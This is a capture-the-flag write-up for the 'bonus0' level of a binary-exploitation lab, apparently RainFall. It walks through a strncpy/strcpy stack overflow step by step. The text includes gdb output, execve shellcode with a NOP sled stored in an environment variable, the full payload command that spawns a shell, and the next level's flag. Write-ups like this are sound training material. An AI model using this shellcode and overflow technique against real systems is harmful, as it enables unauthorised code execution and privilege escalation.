## Context

There is an executable file named bonus0 that reads from the standard input twice. The two read strings are then displayed on the standard output, separated by a space.

With the help of gdb, we can reconstruct the [source code](source.c). A main() function makes a call to a pp() function which itself calls a p() function twice. It is in the p() function that stdin is read and stored using strncpy (with len = 20). In the pp() function the first read string is copied into a buffer using strcpy(). Its last byte is replaced by a space, then the second read string is added to the buffer using strcat().

## Lead

We can exploit strncpy(): the manual tells us that if `src` is less than `len` characters long, the remainder of `dst` is filled with ‘\0’ characters. Otherwise, `dst` is not terminated. So if we fill a string of 20 characters or more for the first read(), s1 will not be ended by a '\0'. Since s1 and s2 follow each other on the stack, this will have an interesting consequence: when calling strcpy() in the pp() function, the buffer will be filled with s1 and s2 (i.e. up to the '\0' of the s2 string). This will allow us overflow the buffer and overwrite the address contained in EIP. 

## Exploit

What we want to do is give EIP the address of a shellcode. First we need to find the offset of EIP, which we can do with gdb:
```
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
ABCDEFGHIJKLMNOPQRST
AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���

Program received signal SIGSEGV, Segmentation fault.
0x4d4c4b4a in ?? ()
```
Here we have a segmentation fault because EIP contains 0x4d4c4b4a which does not refer to a valid memory area. 0x4d4c4b4a corresponds in fact to 'JKLM' in s2. The offset of EIP is 9 (from A to J).

Since there is not enough space in the buffer for our shellcode (the one we used before), what we can do is to save it in an environment variable. We add a [NOP slide](https://en.wikipedia.org/wiki/NOP_slide) just to be sure we get there:
```
bonus0@RainFall:~$ export shellcode=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

We then need to find the address of this environment variable. Let's write a small program in /tmp for this:
```
#include <stdlib.h>
#include <stdio.h>

int main(void)
{
    printf("%p\n", getenv("shellcode"));
    return(0);
}
```
And here we are:
```
bonus0@RainFall:/tmp$ ./a.out 
0xbffffeca
```

We can now build our input: first 20 bytes to fill s1, then 9 bytes to reach EIP, then the shellcode address, and finally 7 bytes to complete s2:
```
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "A" * 9 + "\xca\xfe\xff\xbf" + "A" * 7'; cat) | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
We can now reach to the next level with the command `su bonus1` and fill in the flag found as a password.